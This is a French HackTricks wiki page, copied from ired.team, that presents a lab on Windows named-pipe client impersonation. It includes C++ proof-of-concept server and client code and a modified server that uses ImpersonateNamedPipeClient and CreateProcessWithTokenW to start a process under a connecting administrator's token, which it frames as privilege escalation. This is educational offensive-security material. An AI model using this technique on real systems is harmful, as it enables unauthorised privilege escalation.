# Impersonnalisation du client de canal nommé

## Impersonnalisation du client de canal nommé

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Cette information a été copiée de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Vue d'ensemble

Un `pipe` est un bloc de mémoire partagée que les processus peuvent utiliser pour la communication et l'échange de données.

`Named Pipes` est un mécanisme Windows qui permet à deux processus non apparentés d'échanger des données entre eux, même si les processus se trouvent sur deux réseaux différents. C'est très similaire à l'architecture client/serveur car des notions telles que `un serveur de canal nommé` et un `client de canal nommé` existent.

Un serveur de canal nommé peut ouvrir un canal nommé avec un nom prédéfini, puis un client de canal nommé peut se connecter à ce canal via le nom connu. Une fois la connexion établie, l'échange de données peut commencer.

Ce laboratoire concerne un code PoC simple qui permet :

* de créer un serveur de canal nommé simple et mono-thread qui acceptera une connexion client
* au serveur de canal nommé d'écrire un message simple dans le canal nommé afin que le client de canal puisse le lire

## Code

Ci-dessous se trouve le PoC pour le serveur et le client :

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
```markdown
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## Exécution

Ci-dessous, le serveur de canal nommé et le client de canal nommé fonctionnent comme prévu :

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Il est important de noter que la communication par canaux nommés utilise par défaut le protocole SMB :

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Vérification de la manière dont le processus maintient un handle vers notre canal nommé `mantvydas-first-pipe` :

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

De manière similaire, nous pouvons voir le client ayant un handle ouvert vers le canal nommé :

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Nous pouvons même voir notre canal avec powershell :
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
```markdown
## Impersonation de jeton

{% hint style="info" %}
Notez que pour usurper le jeton du processus client, vous devez avoir (le processus serveur créant le pipe) le privilège de jeton **`SeImpersonate`**.
{% endhint %}

Il est possible pour le serveur de pipe nommé d'usurper le contexte de sécurité du client de pipe nommé en utilisant un appel API `ImpersonateNamedPipeClient` qui, à son tour, change le jeton du thread actuel du serveur de pipe nommé avec celui du jeton du client de pipe nommé.

Nous pouvons mettre à jour le code du serveur de pipe nommé comme ceci pour réaliser l'usurpation - notez que les modifications sont visibles à partir de la ligne 25 :
```
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
Lorsque nous exécutons le serveur et nous y connectons avec le client qui fonctionne sous le contexte de sécurité de administrator@offense.local, nous pouvons voir que le thread principal du serveur de pipe nommé a assumé le jeton du client de pipe nommé - offense\administrator, bien que le PipeServer.exe lui-même fonctionne sous le contexte de sécurité de ws01\mantvydas. Cela ressemble-t-il à une bonne méthode pour élever les privilèges ?

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
